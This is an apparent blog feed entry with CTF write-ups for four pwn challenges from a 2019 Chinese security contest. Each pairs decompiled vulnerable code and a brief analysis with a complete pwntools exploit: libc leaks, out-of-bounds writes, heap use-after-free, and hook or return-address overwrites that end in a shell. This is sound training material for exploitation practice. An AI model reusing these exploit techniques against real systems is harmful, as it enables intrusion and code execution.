<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Room of Requirement</title>
  
  <subtitle>pwn what you want</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://siriuswhiter.tk/"/>
  <updated>2019-04-23T05:17:51.058Z</updated>
  <id>http://siriuswhiter.tk/</id>
  
  <author>
    <name>Sirius Whiter</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>信安大赛2019-pwn</title>
    <link href="http://siriuswhiter.tk/2019/04/22/%E4%BF%A1%E5%AE%89%E5%A4%A7%E8%B5%9B2019-pwn/"/>
    <id>http://siriuswhiter.tk/2019/04/22/信安大赛2019-pwn/</id>
    <published>2019-04-22T12:01:10.000Z</published>
    <updated>2019-04-23T05:17:51.058Z</updated>
    
    <content type="html"><![CDATA[<p><em>太菜了，堆的题要么找不到洞，要么找不到好的思路，得加紧训练</em></p><h1 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>关键函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  memset(&amp;s, 0, 0x100uLL);</span><br><span class="line">  memset(arr, 0, 0x28uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 40; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;input index&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;idx);</span><br><span class="line">    printf(&quot;now value(hex) %x\n&quot;, (unsigned int)arr[idx]);</span><br><span class="line">    puts(&quot;input new value&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;new_v);</span><br><span class="line">    arr[idx] = new_v;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;do you want continue(yes/no)? &quot;);</span><br><span class="line">  read(0, &amp;s, 0x100uLL);</span><br><span class="line">  return strncmp(&amp;s, &quot;yes&quot;, 3uLL) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>原意是可以给arr的每个地址赋新值，但是因为其没有对idx进行限制，因而相当于任意地址写，同时因为其会先将地址处的值显示出来，因而可以先泄露地址</p><p>通过泄露栈中的libc_start_main+240,得到libc基址同时查询得到libc版本为2.23，因此可以直接计算处one_adget 地址，最后用同样的方法再循环写入返回地址为</p><p>one_gadget即可；</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#sh=process(&apos;./pwn&apos;)</span><br><span class="line">sh=remote(&apos;1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com&apos;,&apos;57856&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">sh.sendlineafter(&apos;name:&apos;,&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">leak = &apos;&apos;</span><br><span class="line">def scan(idx):</span><br><span class="line">global leak</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(idx))</span><br><span class="line">sh.recvuntil(&apos;(hex) &apos;)</span><br><span class="line">r = sh.recvuntil(&apos;\n&apos;,drop=True)[-2:]</span><br><span class="line">print r</span><br><span class="line">leak =r+leak</span><br><span class="line">l=int(r,16)</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(l))</span><br><span class="line"></span><br><span class="line">for i in range(632,638):</span><br><span class="line">scan(i)</span><br><span class="line">leak=leak.ljust(8,&apos;\x00&apos;)</span><br><span class="line">print leak</span><br><span class="line">leak_addr = int(&apos;0x&apos;+leak,16)</span><br><span class="line">print hex(leak_addr)</span><br><span class="line"></span><br><span class="line">libc_start = leak_addr -240 </span><br><span class="line">print &apos;libc_start_main:&apos; + hex(libc_start)</span><br><span class="line">libc = leak_addr-elf.plt[&apos;__libc_start_main&apos;]-0x1ff20</span><br><span class="line">print hex(libc)</span><br><span class="line">#system = libc+ 0x045390</span><br><span class="line">#binsh = libc + 0x18cd57</span><br><span class="line">one = 0x4526a + libc</span><br><span class="line">print &apos;one: &apos;+ hex(one)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = [0,0,0,0,0,0,0,0]</span><br><span class="line">for i in range(0,8):</span><br><span class="line">ls[i] = one%0x100</span><br><span class="line">print hex(ls[i])</span><br><span class="line">one /= 0x100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(344,352):</span><br><span class="line">j=i-344</span><br><span class="line">print hex(ls[j])</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(i))</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(ls[j]))</span><br><span class="line">#sleep(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh,&apos;b* 0xc2a&apos;+str(libc))</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(-1))</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(1))</span><br><span class="line">sh.sendlineafter(&apos;? \n&apos;,&apos;no&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h1><p><em>做一半电脑死机了。。坑。。。</em></p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><em>漏洞点比较隐蔽，看了好久</em></p><p>关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 remove()</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  if ( cnt )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of daily:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    idx = atoi(&amp;buf);</span><br><span class="line"></span><br><span class="line">    if ( *(_QWORD *)&amp;ptr[4 * idx + 2] )                 // 没有检查idx的大小</span><br><span class="line">    &#123;</span><br><span class="line">      free(*(void **)&amp;ptr[4 * idx + 2]);</span><br><span class="line">      *(_QWORD *)&amp;ptr[4 * idx + 2] = 0LL;</span><br><span class="line">      ptr[4 * idx] = 0;</span><br><span class="line">      puts(&quot;remove successful!!&quot;);</span><br><span class="line">      --cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No pages in the daily&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>前面很容易想到利用malloc_consolidate 来泄露libc地址及heap地址；</p><p>而漏洞点在于在删除chunk时，没有对输入的idx进行检查，所以只要释放的地址处的chunk可以通过检查，就可以被置入bin链表中</p><p>而只要泄露堆地址，就可以运算得到其index，因为输入的是整型数据，所以在一定情况下堆分配离bss段较远时会出错，不过这个问题可以多次尝试来解决</p><p>所以在堆上伪造如同bss段的结构体(size+ptr)，delete时将idx指向这里free掉一个chunk，而因为这样并不会情况bss段存储的结构体，我们就可以UAF</p><p>最后因为尝试one_gadget条件无法满足，最后只能换成调用system函数来覆盖free_hook来getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./pwn&apos;)</span><br><span class="line">#sh = remote(&apos;5f0cfa41a052c741f4beafe9d083d281.kr - lab.com&apos;,58512)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">    sh.recvuntil(&apos;Your choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;daily\n&apos;)</span><br><span class="line">    sh.send(con)</span><br><span class="line">def dele(idx):</span><br><span class="line">    sh.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;4&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def edit(idx,con):</span><br><span class="line">    sh.recvuntil(&apos;Your choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;daily&apos;)</span><br><span class="line">    sh.send(con)</span><br><span class="line">def show():</span><br><span class="line">    sh.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x20,&apos;a&apos;)</span><br><span class="line">add(0x800,&apos;a&apos;)</span><br><span class="line">add(0x10,&apos;a&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x100,&apos;aaaaaa&apos;)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">main_arena = u64(sh.recv(6).ljust(8,&apos;\x00&apos;)) - 0x548</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - libc.symbols[&apos;__malloc_hook&apos;] - 0x10</span><br><span class="line">one_gadget = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">free_hook = libc_base + libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(1,&apos;a&apos;*24)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&apos;a&apos;*24)</span><br><span class="line">heap = u64(sh.recv(4).ljust(8,&apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x700-8,&apos;aaa&apos;)</span><br><span class="line">add(0x10,&apos;aaa&apos;)</span><br><span class="line">add(0x10,&apos;aaa&apos;)</span><br><span class="line">dele(4)</span><br><span class="line">dele(5)</span><br><span class="line">index = (heap + 0x10 - 0x602060)/16</span><br><span class="line">payload = p64(0x100) + p64(heap + 0x830 + 0x10)</span><br><span class="line">edit(1,payload)</span><br><span class="line">dele(index)</span><br><span class="line"></span><br><span class="line">add(0x10,p64(0x602058))</span><br><span class="line">add(0x10,&apos;c&apos;)</span><br><span class="line">add(0x10,&apos;d&apos;)</span><br><span class="line">add(0x10,&apos;e&apos;)</span><br><span class="line"></span><br><span class="line">edit(7,p64(free_hook))</span><br><span class="line">edit(0,p64(one_gadget))</span><br><span class="line">edit(1,&apos;/bin/sh\x00&apos;)</span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>保护<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>直接给了溢出，同时除了PIE保护全开，没有给libc，可以确定是ret2_dl_runtime_resolve</p><p>可以直接使用roputils库 ，在bss段伪造结构体 ，然后上脚本即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x08048390</span><br><span class="line">bss = 0x0804a068</span><br><span class="line">vulFunc = 0x0804852d</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./pwn&apos;)</span><br><span class="line">p = remote(&apos;da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com&apos;,&apos;33865&apos;)</span><br><span class="line">rop = roputils.ROP(&apos;./pwn&apos;)</span><br><span class="line">addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line"></span><br><span class="line"># step1 : write sh &amp; resolve struct to bss</span><br><span class="line">buf1 = &apos;a&apos; * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)</span><br><span class="line">buf3 = &apos;a&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="double"><a href="#double" class="headerlink" title="double"></a>double</h1><p><em>其实很简单的一道题。。。结果当天没做出来。。过了一天，昨天睡觉前突然意识到怎么做。。。最后写出来用了不到20分钟！！难受</em></p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>程序使用链表来记录分配的chunk，删除时也就是链表的元素删除，所以当时会陷入对链表的问题的查找，而实际上问题不在这里</p><p>主要问题函数：</p><p>分配的new函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 new()</span><br><span class="line">&#123;</span><br><span class="line">  int size; // [rsp+4h] [rbp-12Ch]</span><br><span class="line">  struc *ptr; // [rsp+8h] [rbp-128h]</span><br><span class="line">  struc *last; // [rsp+10h] [rbp-120h]</span><br><span class="line">  char *dest; // [rsp+18h] [rbp-118h]</span><br><span class="line">  char s2; // [rsp+20h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+128h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  ptr = (struc *)malloc(0x18uLL);</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Your data:&quot;);</span><br><span class="line">    size = get_str(&amp;s2, 0x100);</span><br><span class="line">    last = ptrStop;</span><br><span class="line">    if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;idx = last-&gt;idx + 1;</span><br><span class="line">      ptr-&gt;size = last-&gt;size;</span><br><span class="line">      ptr-&gt;chunk_ptr = last-&gt;chunk_ptr;</span><br><span class="line">      ptr-&gt;next_chunk = 0LL;</span><br><span class="line">      last-&gt;next_chunk = (__int64)ptr;</span><br><span class="line">      ptrStop = ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (char *)malloc(size + 1);</span><br><span class="line">      if ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Malloc Failed, Error&quot;);</span><br><span class="line">        free(ptr);</span><br><span class="line">        return __readfsqword(0x28u) ^ v6;</span><br><span class="line">      &#125;</span><br><span class="line">      strncpy(dest, &amp;s2, size + 1);</span><br><span class="line">      ptr-&gt;size = size;</span><br><span class="line">      ptr-&gt;chunk_ptr = (__int64)dest;</span><br><span class="line">      ptr-&gt;next_chunk = 0LL;</span><br><span class="line">      if ( ptrStart )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr-&gt;idx = last-&gt;idx + 1;</span><br><span class="line">        last-&gt;next_chunk = (__int64)ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        ptr-&gt;idx = 0;</span><br><span class="line">        ptrStart = (__int64)ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      ptrStop = ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Success, index: %d\n&quot;, (unsigned int)ptr-&gt;idx);</span><br><span class="line">    return __readfsqword(0x28u) ^ v6;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Malloc Failed,Error&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>这个程序的问题在于分配chunk时，会检查内容是否相同，如果相同的话，就不再多分配chunk，只会分配结构体 chunk然后将其中的指针指向已知的chunk，也就会出现两个指针指向同一个chunk，我们就可以UAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) )</span><br></pre></td></tr></table></figure><p>而其实这就已经是极大的漏洞了，利用这个洞完全可以泄露libc然后覆盖fd指针到malloc_hook， one_gadget 一把梭getshell</p><p><em>完全没必要总去想着控制链表指针什么的…费力不讨好</em></p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh=process(&apos;./pwn&apos;)</span><br><span class="line">#sh=remote(&apos;&apos;)#(&apos;85c3e0fcae5e972af313488de60e8a5a.kr-lab.com&apos;,&apos;58512&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">def new(con):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;data:\n&apos;,con)</span><br><span class="line"></span><br><span class="line">def edit(idx,con):</span><br><span class="line">        sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">        sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">        sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">new(&apos;b&apos;*8)</span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line"></span><br><span class="line">new(&apos;e&apos;*0x20)</span><br><span class="line"></span><br><span class="line">#----------------leak heap base------------------------------//没有必要， 所以其实可以更短</span><br><span class="line">dele(2)</span><br><span class="line">dele(0)</span><br><span class="line">show(1)</span><br><span class="line">heap = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x60</span><br><span class="line">print hex(heap)</span><br><span class="line"></span><br><span class="line">new(&apos;d&apos;*8)</span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">#---------------leak libc base-----------------------------</span><br><span class="line">dele(3)</span><br><span class="line">show(4)</span><br><span class="line"></span><br><span class="line">libc = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-88-0x3c4b20</span><br><span class="line">print hex(libc)</span><br><span class="line">one = libc+0x4526a</span><br><span class="line">print hex(one)</span><br><span class="line"></span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line"></span><br><span class="line">#------------------hjack malloc_hook to getshell-----------</span><br><span class="line">dele(5)</span><br><span class="line">edit(6,p64(libc+0x3c4b20-0x33))</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line">new(&apos;a&apos;*0x13+p64(one)+p64(0)*9)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(&apos;end&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;太菜了，堆的题要么找不到洞，要么找不到好的思路，得加紧训练&lt;/em&gt;&lt;/p&gt;
